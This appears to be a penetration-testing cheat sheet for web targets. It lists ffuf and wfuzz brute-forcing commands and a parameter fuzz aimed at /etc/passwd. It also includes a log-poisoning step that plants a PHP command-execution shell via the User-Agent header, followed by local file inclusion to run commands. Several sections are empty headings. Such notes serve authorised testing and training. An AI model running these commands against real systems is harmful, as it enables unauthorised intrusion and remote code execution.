# Hypertext Transfer Protocol

### Source Code Review

_Review source code and Page Contents With Burp Suite/Site Map. Add Target Scope under Target > Scope > Add_

_View Landing Page /_

_Add domain or hostname to Kali /etc/hosts file and review landing page /_

### General Scoping

* _Discover Potential Filename patterns for custom bruteforcing directories and files._
* _Discover usernames or email addresses with exiftool after downloading._
* _Discover HTTP Server Version._
* _Discover JavaScript Version._
* _Search For JavaScript Known Version Vulnerabilities._
* _Discover Web Application Name._
* _Discover Web Application Version._
* _Search For Web Application Known Version Vulnerabilities._
* _check certificate if applicable._
* _Discover Admin Login pages._
* _Test For default credentials._
* _Discover User Logins._
* _Discover User Registrations._

### View Certificate Information

_Browse to the `https://$ip/` and view the certificate_

### Server Header Information

```
curl -IL $webserver
```

### Bruteforce Directories and Files

_Be sure to test both http and https_

_Directories_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/FUZZ/ -fc 404
```
{% endcode %}

_Files_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

_Words_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://$ip/FUZZ -fc 404
```
{% endcode %}

_Extensions_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -u http://$ip/somedir/FUZZ.someExtension -fc 404
```
{% endcode %}

### Hidden parameter discovery

_Test for hidden parameters on found endpoints or files_

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://$ip/somefile?FUZZ=../../../../../../etc/passwd -v -fc 404 | grep URL
```
{% endcode %}

### Response Headers

_Search headers such as X-Powered-By. This may reveal vulnerable versioning_

```
curl -I http://$ip/
```

### Nikto Vulnerability Scanner

```
nikto -h http://$ip
```

### Command Injection

### Local File inclusion

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://$ip/site/index.php?page=FUZZ
```
{% endcode %}

_Linux_

```
curl http://$ip/ -A "<?php system(\$_GET['cmd']);?>"
```

_Windows_

```
curl http://$ip/site/index.php\?page=../../path/to/log\&cmd=ipconfig
```

### Remote File inclusion

### SQL injection

#### **Authentication Bypass**

Manually confirm the results to then filter out unwanted responses by using --hh

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "form" --hc 404 $url
```

```
wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404 $url
```

### XXE

### XSS
